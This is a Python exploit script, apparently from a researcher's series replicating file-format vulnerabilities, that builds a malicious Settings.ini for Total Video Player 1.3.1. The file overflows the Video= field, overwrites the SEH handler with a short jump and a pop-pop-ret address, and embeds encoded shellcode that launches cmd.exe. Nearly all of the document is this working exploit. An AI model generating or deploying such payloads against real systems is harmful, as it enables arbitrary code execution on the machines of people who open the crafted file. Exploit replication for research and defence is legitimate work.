#Total Video Player 1.3.1 Exploit
#CVE: N/A
#OSVDB OSVDB-100619
#Elias Augusto 8/18/2019
#Generates malicious Settings.ini file
#Part of an ongoing series where I replicate exploits of  file format based vulnerabilities based off of CVE/OSVDB descriptions

#Alpha mixed encoded windows/exec cmd=cmd.exe, 446 bytes
buf =  ""
buf += "\x89\xe0\xda\xca\xd9\x70\xf4\x5d\x55\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x59\x78\x4f"
buf += "\x72\x77\x70\x73\x30\x73\x30\x35\x30\x4e\x69\x38\x65"
buf += "\x54\x71\x6b\x70\x33\x54\x4c\x4b\x66\x30\x74\x70\x6e"
buf += "\x6b\x63\x62\x34\x4c\x6e\x6b\x61\x42\x54\x54\x4e\x6b"
buf += "\x64\x32\x47\x58\x64\x4f\x6f\x47\x62\x6a\x35\x76\x44"
buf += "\x71\x4b\x4f\x4c\x6c\x65\x6c\x33\x51\x43\x4c\x77\x72"
buf += "\x46\x4c\x35\x70\x4b\x71\x6a\x6f\x44\x4d\x65\x51\x7a"
buf += "\x67\x49\x72\x4c\x32\x66\x32\x66\x37\x4c\x4b\x56\x32"
buf += "\x34\x50\x6c\x4b\x52\x6a\x47\x4c\x4e\x6b\x50\x4c\x46"
buf += "\x71\x34\x38\x4b\x53\x30\x48\x45\x51\x5a\x71\x50\x51"
buf += "\x6c\x4b\x56\x39\x55\x70\x63\x31\x38\x53\x6e\x6b\x31"
buf += "\x59\x74\x58\x68\x63\x74\x7a\x47\x39\x4e\x6b\x67\x44"
buf += "\x4c\x4b\x33\x31\x58\x56\x66\x51\x6b\x4f\x4c\x6c\x39"
buf += "\x51\x78\x4f\x66\x6d\x47\x71\x39\x57\x47\x48\x59\x70"
buf += "\x50\x75\x59\x66\x55\x53\x33\x4d\x5a\x58\x37\x4b\x33"
buf += "\x4d\x77\x54\x63\x45\x78\x64\x33\x68\x6c\x4b\x66\x38"
buf += "\x31\x34\x33\x31\x6b\x63\x31\x76\x6e\x6b\x66\x6c\x50"
buf += "\x4b\x4e\x6b\x62\x78\x35\x4c\x43\x31\x4a\x73\x4e\x6b"
buf += "\x76\x64\x6e\x6b\x55\x51\x78\x50\x4c\x49\x42\x64\x77"
buf += "\x54\x47\x54\x61\x4b\x31\x4b\x51\x71\x61\x49\x61\x4a"
buf += "\x56\x31\x39\x6f\x4d\x30\x43\x6f\x63\x6f\x33\x6a\x4e"
buf += "\x6b\x45\x42\x38\x6b\x6e\x6d\x63\x6d\x70\x6a\x66\x61"
buf += "\x6c\x4d\x4e\x65\x6e\x52\x65\x50\x37\x70\x57\x70\x32"
buf += "\x70\x51\x78\x56\x51\x4e\x6b\x52\x4f\x6e\x67\x69\x6f"
buf += "\x69\x45\x6d\x6b\x6c\x30\x4c\x75\x69\x32\x51\x46\x42"
buf += "\x48\x6f\x56\x6d\x45\x6d\x6d\x4d\x4d\x4b\x4f\x6a\x75"
buf += "\x65\x6c\x47\x76\x53\x4c\x66\x6a\x6f\x70\x79\x6b\x49"
buf += "\x70\x71\x65\x56\x65\x6d\x6b\x52\x67\x56\x73\x53\x42"
buf += "\x42\x4f\x50\x6a\x77\x70\x76\x33\x69\x6f\x39\x45\x52"
buf += "\x43\x72\x4d\x30\x64\x44\x6e\x42\x45\x62\x58\x45\x35"
buf += "\x33\x30\x41\x41"

buffer="[Support Files]\r\n"
buffer+="All=All Support files|*.m3u; *.cda; *.avi; *.dat; *.3gp; *.qt; *.mov; *.mpg; *.mpeg; *.m1v; *.wmv; *.asf; *.ogm; *.mkv; *.dsm; *.vob; *.mp4; *.ra; *.rm; *.ram; *.amr; *.3gp; *.3gp2; *.3g2; *.3gpp; *.swf; *.flv; *.fli; *.flc; *.rmvb; *.gif; *.mp3; *.wma; *.ac3; *.wav; *.aac; *.aiff; *.au; *.mp2; *.m4v; *.m4a; *.mmf; *.awb; *.flac; *.dv; *.ape; *.mpc; *.cin; *.ts|\r\n\r\n"

buffer+="[Support Groups]\r\n"
#Our vulnerable buffer
buffer+="Video="
buffer+="A"*256
buffer+="\xEB\x06\x90\x90" #JMP SHORT 06 (NSEH)
buffer+="\xB3\x0F\x01\x10" #Address of pop pop ret - note, if there was ASLR we could easily do a JMP backwards, egghunter, and hide an egg in one of the other variables
buffer+=buf #add shellcode to pop shell
buffer+="A"*4290 #4736-446
buffer+="\r\n"
#End of vulnerable buffer
buffer+="Audio=Audio files|*.mp3; *.wma; *.mp2; *.ac3; *.ogg; *.wav; *.aac; *.aiff; *.au; *.ram; *.ra; *.cda; *.amr; *.m4a; *.mmf; *.awb; *.flac; *.ape; *.mpc|\r\n"
buffer+="PL=Playlist file(.m3u)|*.m3u|\r\n\r\n"

buffer+="[AssociateType]\r\n"
buffer+="AssociateType =1\r\n\r\n"

s=open("Settings.ini","w")
s.write(buffer)
s.close()
